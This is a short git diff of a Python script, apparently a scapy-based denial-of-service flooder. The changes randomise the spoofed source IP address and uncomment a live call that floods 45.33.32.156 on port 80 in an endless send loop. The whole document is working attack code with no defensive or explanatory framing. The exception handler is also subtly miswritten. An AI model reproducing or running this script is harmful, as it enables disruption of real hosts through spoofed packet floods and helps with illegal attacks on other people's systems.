@@ -1,6 +1,7 @@
 from scapy.all import *
+import random
 
-src = '22.22.22.22'
+src = f'{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
 source_port = 56666
 
 def ddos(target, port):
@@ -16,7 +17,7 @@ def ddos(target, port):
         try:
             while True:
                 send(pkt,inter= .001)
-                print(f"Packet(s) sent {i}")
+                print(f"Packet(s) sent [{i}]" , end = "\r")
                 i=i+1
         except KeyboardInterrupt():
             sys.exit('\n')
@@ -28,4 +29,4 @@ def ddos(target, port):
         print('Operation was cancelled.')
         sys.exit('\n')
     
-#ddos('45.33.32.156', 80)
+ddos('45.33.32.156', 80)
